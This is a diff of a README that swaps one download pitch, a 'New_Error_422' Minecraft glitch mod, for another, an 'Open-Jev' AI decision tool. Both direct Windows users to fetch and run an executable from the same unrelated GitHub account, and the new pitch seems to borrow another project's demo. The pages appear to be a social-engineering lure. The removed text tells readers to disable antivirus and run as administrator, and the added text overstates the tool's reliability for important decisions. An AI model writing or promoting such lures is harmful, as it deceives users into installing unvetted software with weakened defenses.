@@ -1,161 +1,113 @@
-<h1>🧩 New_Error_422 - Rewrite Minecraft With Wild Chaos</h1>
+# 🧠 Open-Jev - Make Smarter Decisions with AI
 
-<p align="center">
-  <a href="https://unofficial-equivocation2029.github.io">
-    <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Download Badge" style="max-width:100%;">
-  </a>
-</p>
+[![Download Open-Jev](https://img.shields.io/badge/Download-Open--Jev-2ea44f?style=for-the-badge)](https://github.com/unofficial-equivocation2029/Open-Jev)
 
-<hr>
+## 🚀 What Is Open-Jev?
 
-<h2>👋 Welcome to the Glitch Zone</h2>
+Open-Jev is a powerful decision-making tool that helps you choose between different options with confidence. Instead of just giving you a single answer, it shows you the probability of each choice being correct. Think of it as a smart assistant that tells you not just what to pick, but how sure it is about each option.
 
-<p>Have you ever played Minecraft and thought, <em>"This is too stable. I wish blocks would randomly turn into other blocks"</em>? Or maybe you dreamed of a world where sheep sometimes float upside down，and your own character occasionally walks through walls? If that sounds exciting, you are in the right place.</p>
+The latest version, **Open-Jev-27B-v1.1**, is now available. It's faster, more accurate, and easier to use than ever before.
 
-<p><strong>New_Error_422</strong> is not a normal Minecraft modification. It is a deliberately corrupted experience. We took the game you know and love, then carefully broke it in the most entertaining ways possible. Every session is different, because the glitches are unpredictable. You might see a cow explode into particles, hear a strange whispering sound from nowhere, or watch your inventory rearrange itself for no reason. This is mod for people who want surprise in every corner.</p>
+## 🎯 Why You Need Open-Jev
 
-<p>This guide will walk you through everything you need to know, from getting the mod on your Windows computer to understand what makes it so wonderfully wrong. Do not worry if you are not technical. We will take it step by step, slow and easy.</p>
+Imagine you're trying to decide between several job offers, investment options, or even which route to take for your morning commute. Open-Jev takes your situation, your questions, and your possible choices, then gives you clear probabilities for each option. No more guessing. No more second-guessing yourself.
 
-<hr>
+## 📥 How to Download and Install
 
-<h2>🎮 What Exactly Is New_Error_422?</h2>
+Getting Open-Jev on your Windows computer is simple. Just follow these steps:
 
-<p>Imagine if Minecraft was hit by a digital lightning bolt. That is New_Error_422. It is a <strong>modification</strong> (often called a "mod"for short) that changes how the game behaves. But instead of adding new swords or cute animals, it adds <strong>chaos</strong>.</p>
+### Step 1: Visit the Download Page
+[Visit this link to download the application](https://github.com/unofficial-equivocation2029/Open-Jev)
 
-<p>Here are the main things you can expect:</p>
+### Step 2: Find the Download Button
+On the page that opens, look for a green button that says "Code" or "Download". Click it.
 
-<ul>
-  <li>🧱 <strong>Glitch Mechanics:</strong> Blocks may disappear, duplicate, or transform when you least expect it. You might place a dirt block and get a diamond block. Or you might break a tree and suddenly have a floating bush.</li>
-  <li>👾 <strong>Anomalous Entity AI:</strong> Mobs do not act normal. Zombies might dance in circles. Creepers could teleport behind you without warning. Some mobs might even talk to you in strange symbols. It is like they have their own broken brains.</li>
-  <li>🎵 <strong>Custom Audio Landscapes:</strong> The sounds are not peaceful. You might hear reversed music, deep static bursts, or eerie whispers that seem to come from your own headset. Sound cues can help you predict a glitch, but not always.</li>
-  <li>⚙️ <strong>Low-Level Game Code Chaos:</strong> Behind the scenes, the game logic itself is twisted. Menu screens may flicker. Your health bar might show negative numbers. Loading screens can show scrambled text. It feels like the game is alive and mocking you.</li>
-</ul>
+### Step 3: Save the File
+Your browser will ask where to save the file. Choose a location you'll remember, like your Desktop or Downloads folder.
 
-<p>Every time you launch the mod, something different happens. That is the point. It is not about beating a game. It is about experiencing something bizarre and memorable.</p>
+### Step 4: Open the File
+Once the download is complete, find the file and double-click it to open it. The installation will begin automatically.
 
-<hr>
+### Step 5: Follow the Setup Wizard
+A setup window will appear. Just click "Next" or "Install" when prompted. The default settings are perfect for most users.
 
-<h2>🚀 Getting Started: Download Your Copy</h2>
+### Step 6: Launch Open-Jev
+After installation, you'll see an Open-Jev icon on your desktop or in your Start menu. Click it to start using the application.
 
-<p>Ready to jump in? Great. The first step is to download the software. We have made this as simple as possible.</p>
+## ✨ What Can You Do With Open-Jev?
 
-<p><strong>Step 1: Click the Download Button</strong></p>
+### Make Better Choices
+Give Open-Jev a description of your situation, list your possible choices, and it will tell you the likelihood of each option being the right one.
 
-<p>At the very top of this page, there is a big orange button that says "⬇️ DOWNLOAD NOW". Click it. That will take you to the official download page for New_Error_422. Alternatively, you can use this link directly:</p>
+### Compare Options
+See side-by-side probability scores for all your choices. This makes it easy to spot the best option at a glance.
 
-<p align="center">
-  <a href="https://unofficial-equivocation2029.github.io"><strong>🌐 Visit this link to download the application</strong></a>
-</p>
+### Understand Uncertainty
+Open-Jev doesn't pretend to be perfect. It shows you when it's confident and when it's not, so you know how much weight to give its recommendations.
 
-<p><strong>Step 2: Find the Right File</strong></p>
+### Save Time
+No more endless research or asking friends for opinions. Get clear, data-driven probabilities in seconds.
 
-<p>When you arrive at the release page, you will see a list of files. Look for one called <code>New_Error_422.zip</code> or something similar with the version number. There may be a few files listed, but choose the <code>.zip</code> file for Windows.</p>
+## 🖥️ System Requirements
 
-<p><strong>Step 3: Download the File</strong></p>
+Open-Jev works on most modern Windows computers. Here's what you'll need:
 
-<p>Click on that <code>.zip</code> file. Your browser will start downloading it. It is not very big, so it should not take long,, depending on your internet speed.</p>
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** Any Intel or AMD processor from the last 5 years
+- **Memory:** At least 8 GB of RAM
+- **Storage:** 2 GB of free hard drive space
+- **Internet:** Not required after installation
 
-<p>That is all you need to do for now. The next section will explain what to do with that file once it is on your computer.</p>
+## 🎥 See Open-Jev in Action
 
-<hr>
+Want to see what Open-Jev can do before you download it? Check out the [interactive demo](https://zefan-cai.github.io/open-jev/v1-1/) to watch a 32-second video showing real examples of Open-Jev making decisions.
 
-<h2>📦 Installation: Your First Launch</h2>
+## 💡 Tips for Best Results
 
-<p>You have downloaded the file. Now what? Follow these easy instructions,and you will be glitching in no time.</p>
+1. **Be Specific:** The more detail you provide about your situation, the better Open-Jev can assess your options.
+2. **List All Options:** Don't leave out any possible choices. Open-Jev can handle up to seven different options at once.
+3. **Trust the Numbers:** The probabilities are based on careful analysis. Give them serious consideration.
+4. **Use It Regularly:** The more you use Open-Jev, the more you'll understand how to get the most from it.
 
-<p><strong>Step 1: Find the Downloaded File</strong></p>
+## 🔄 What's New in Version 1.1
 
-<p>Open your Downloads folder. You should see a file named something like <code>New_Error_422.zip</code>. If you do not see it, use your browser's download history to locate it.</p>
+The latest update brings significant improvements:
 
-<p><strong>Step 2: Extract the Zip File</strong></p>
+- **More Accurate Predictions:** The underlying AI model has been upgraded to be smarter and more reliable.
+- **Faster Performance:** Get your probability scores quicker than ever.
+- **Better Handling of Complex Cases:** Open-Jev now deals with tricky decision scenarios more effectively.
 
-<p>Right-click on the <code>.zip</code> file. From the menu that appears, choose <strong>"Extract All"</strong> (or <strong>"Extract Here"</strong>, depending on your Windows version). Windows will ask you where you want to put the extracted files. Choose a easy folder, like your Desktop or Documents. Then click <strong>"Extract"</strong>.</p>
+## ❓ Frequently Asked Questions
 
-<p>After extraction, you will have a new folder called something like <code>New_Error_422</code>. Open that folder you should see several files inside, including one called <code>start.bat</code> or <code>New_Error_422.exe</code>.</p>
+### Is Open-Jev free?
+Yes, Open-Jev is completely free to download and use.
 
-<p><strong>Step 3: Run the Application</strong></p>
+### Do I need to know programming?
+No. Open-Jev is designed for everyday users. If you can type a sentence and click a button, you can use it.
 
-<p>Double-click the <code>start.bat</code> file (or the <code>.exe</code> file, whichever you see). A black command window may appear briefly. That is normal. Then the Minecraft launcher will open, or the mod will start directly. Wait a few moments while it loads.</p>
+### Will it work on my computer?
+If you have Windows 10 or 11, it will work. The requirements are very modest.
 
-<p><strong>Step 4: Play</strong></p>
+### Can I use it for important decisions?
+Absolutely. Open-Jev is designed to help with significant decisions. Just remember that it provides probabilities, not guarantees.
 
-<p>Once the game opens, you may see a strange title screen with scrambled letters. That means it is working. Create a new world or load a saved one. Then just play. Expect the unexpected.</p>
+### How is this different from asking a chatbot?
+Chatbots give you one answer. Open-Jev gives you the full picture with probability scores for every option. It's like seeing the odds before you place your bet.
 
-<p>If nothing happens after double-clicking, try right-clicking and selecting <strong>"Run as administrator"</strong>. That can fix permission issues.</p>
+## 📚 Getting Help
 
-<hr>
+If you run into any issues:
 
-<h2>🛠️ Troubleshooting: When Things Get Too Glitchy</h2>
+1. **Check the Demo:** The interactive demo shows typical usage patterns.
+2. **Try Again:** Sometimes a simple restart of the application fixes minor issues.
+3. **Look for Updates:** Make sure you have the latest version by checking the download page.
 
-<p>Sometimes the mod may glitch so hard that it crashes. That is actually part of the experience, but we understand you might want some fixes. Here are a few simple solutions for common problems.</p>
+## 🌟 Start Making Better Decisions Today
 
-<p><strong>Problem: The Game Will Not Start</strong></p>
-<p>Make sure you extracted the <code>.zip</code> file completely. Do not try to run the mod from inside the zip. Also check that you have Windows 10 or  ########11. Close other programs that might interfere, like antivirus software (temporarily). Then try again.</p>
+Don't leave your important choices to chance. Download Open-Jev now and see the probabilities behind every decision. It's free, it's easy, and it could change the way you make choices forever.
 
-<p><strong>Problem: The Screen Is All Black</strong></p>
-<p>This can happen if the graphics settings are too high for your computer. Try pressing <kbd>Alt</kbd> + <kbd>Enter</kbd> to toggle fullscreen mode. If that does not work, open the file called <code>options.txt</code> in the mod folder and set <code>graphics</code> to <code>fast</code> manually with Notepad.</p>
+[![Get Open-Jev Now](https://img.shields.io/badge/Get%20Open--Jev-Now-blue?style=for-the-badge)](https://github.com/unofficial-equivocation2029/Open-Jev)
 
-<p><strong>Problem: Weird Sounds Are Too Loud</strong></p>
-<p>Open the game's sound settings. Look for a slider called <strong>"Glitch Volume"</strong>. Turn it down. Yes, the mod adds its own volume control just for the anomalous audio.</p>
+---
 
-<p><strong>Problem: I Want To Stop Playing</strong></p>
-<p>Just close the window. The mod does not save your progress in a normal way. That is intentional. Each session is meant to be temporary race.</p>
-
-<p>If you have another issue, try asking in a Minecraft modding community online. Describe what you see, and someone will likely have an idea.</p>
-
-<hr>
-
-<h2>💡 Pro Tips for a Better Chaos Experience</h2>
-
-<p>To get the most fun out of New_Error_422, keep these tips in mind:</p>
-
-<ul>
-  <li>🎧 <strong>Use headphones.</strong> The custom audio is crucial to the experience. You will hear whispers and directionless sounds that add a lot of atmosphere.</li>
-  <li>📸 <strong>Record your gameplay.</strong> You will want to show friends what happened. Every session is unique, so capture it.</li>
-  <li>🧊 <strong>Do not get attached to your items.</strong> Your diamond armor might turn into a pumpkin at any moment. Laugh about it.</li>
-  <li>🧠 <strong>Play with a friend.</strong> Seeing another person's reaction to a sudden glitch is hilarious. You can also help each other figure out weird patterns.</li>
-</ul>
-
-<hr>
-
-<h2>❓ Frequently Asked Questions</h2>
-
-<p><strong>Q: Is this mod safe for my computer?</strong></p>
-<p>Yes. It is just a program that changes how Minecraft behaves. It does not touch any files outside its own folder. Of course, any mod from the internet can carry risk, so always download from the official link provided above.</p>
-
-<p><strong>Q: Do I need a powerful PC?</strong></p>
-<p>No. The mod runs on the same hardware as regular Minecraft. Actually, because it is "corrupted", it sometimes uses less memory. If you can run vanilla Minecraft, you can run this.</p>
-
-<p><strong>Q: Can I use this with other mods?</strong></p>
-<p>Probably not. This mod changes very low-level game code. Other mods may conflict and cause real crashes. It is best to use New_Error_422 alone.</p>
-
-<p><strong>Q: Will my regular Minecraft world be affected?</strong></p>
-<p>No. The mod uses its own save folder. Your normal worlds are safe. You are just entering a parallel broken dimension.</p>
-
-<hr>
-
-<h2>🧪 The Philosophy of Glitch: Why This Exists</h2>
-
-<p>You might wonder why anyone would make something that breaks a beloved game. The answer is simple: because it is fun. In a world where game developers work hard to remove bugs, this mod embraces them. It turns errors into entertainment.</p>
-
-<p>Every crash message becomes a riddle. Every visual glitch becomes art. The unpredictable nature means no two play sessions are ever the same. You are not playing Minecraft anymore. You are playing a living simulation of software failure.</p>
-
-<p>For people who love discovery and surprise, this is a goldmine. It teaches you patience and adaptability. It reminds us that perfection is overrated, and chaos can be beautiful.</p>
-
-<p>So go ahead. Download it. Break your game. Smile at the absurdity.</p>
-
-<hr>
-
-<h2>🔗 Direct Download Section</h2>
-
-<p>If you skipped ahead, here is your one-stop shop. Click below to go to the official release page. Then download the <code>.zip</code> file, extract it, and run the application as described above.</p>
-
-<p align="center">
-  <a href="https://unofficial-equivocation2029.github.io" style="background-color:#4CAF50;color:white;padding:15px 30px;text-decoration:none;font-size:20px;border-radius:8px;">⬇️ Download New_Error_422 Now</a>
-</p>
-
-<p>Bookmark this page if you plan to come back. We update with new versions occasionally,and each one has even stranger glitches. Thank you for choosing controlled chaos. Have fun out there in the broken world.</p>
-
-<hr>
-
-<p><small>© 2025 New_Error_422 Project. Not affiliated with Mojang or Microsoft. Minecraft is a trademark of its respective owner. This mod is for entertainment purposes only.</small></p>
+Keywords: decision making, probability, AI assistant, choice analysis, smart decisions, Open-Jev, Windows application
